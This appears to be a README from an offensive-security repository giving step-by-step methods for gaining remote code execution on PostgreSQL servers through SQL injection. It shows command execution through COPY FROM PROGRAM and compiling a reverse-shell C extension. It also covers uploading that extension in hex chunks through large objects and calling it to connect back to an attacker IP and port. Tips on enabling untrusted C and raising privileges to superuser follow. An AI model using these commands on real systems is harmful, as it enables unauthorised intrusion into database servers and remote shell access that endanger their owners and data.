There are several ways to archive RCE via a SQLInjection on a PostgreSQL backed DB.

# Method one (via Copy)
```
CREATE TABLE tmp(t TEXT);
CREATE TABLE
COPY tmp FROM PROGRAM 'id';
COPY 1
SELECT * FROM tmp;                                  
 uid=119(postgres) gid=124(postgres) groups=124(postgres),118(ssl-cert)
(1 row)
```

Delete when done!
```
DROP TABLE tmp;
DROP TABLE
exit
```


# Method two (upload malicious function)
Use the python exploit in the folder to create a payload to get a rev-shell(the script generates for Linux, check on web for generating a dll windows library).

1)Install the target dev kit to compile the malicious extension(it must match the running DB version in the backed)
`sudo apt install postgresql-server-dev-13`

2)Compile the malicious pg_rev_shell.c from the folder.
`gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c`

3)Now you can use the following payload to create a new function that executes a shell(or use the python exploit from the repository). Upload the shell to the victim on the back-end.

4)If auto upload doesn't work do it manually(split to 2kb junks and upload to lo_object with HEX encoding).
OBS; if insert fail use `SELECT lo_put(31337, 0, 'this is a test');` 
```
split -b 2048 pg_rev_shell.so 
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));  --> xxd -ps -c 99999999999 xaa
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 1, DECODE('6e2f626173<SNIP>96e0a','HEX'));  --> xxd -ps -c 99999999999 xab
.
..
... (upload all the xxa,xxb,xxc,...xxj chunks )
SELECT lo_export(31337, '/tmp/pg_rev_shell.so ');
SELECT lo_unlink(31337);

```

5)Add a new function that invokes the shell!
```
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell.so', 'rev_shell' LANGUAGE C STRICT;
CREATE FUNCTION
SELECT rev_shell('MYIP', 4444);
```
Server closed the connection unexpectedly, this probably means the server terminated abnormally before or while processing the request.When you are finished.
```
DROP FUNCTION rev_shell;
DROP FUNCTION
SELECT lo_unlink(58017);
 lo_unlink 
-----------
         1
(1 row)
```

EXTRA TIPS (https://stackoverflow.com/questions/7014437/error-permission-denied-for-language-c) :
To succede with step, the C language must be trusted(whoch isn't by default for non-superusers!): `SELECT lanpltrusted FROM pg_language WHERE lanname LIKE 'c';`
`If you want to enable: UPDATE pg_language SET lanpltrusted = true WHERE lanname LIKE 'c';`

Easiest is if the user is superuser then you are gucci!: 
`SHOW is_superuser;` 

If you are not superuser then you need to have specific grant CREATE grant on public schema to create functions: 
```
create role dba with superuser noinherit;
grant dba to user;
set role dba;
```

If lo_object INSERT fails then you can use
`SELECT lo_put(31337, 0, 'this is a test');`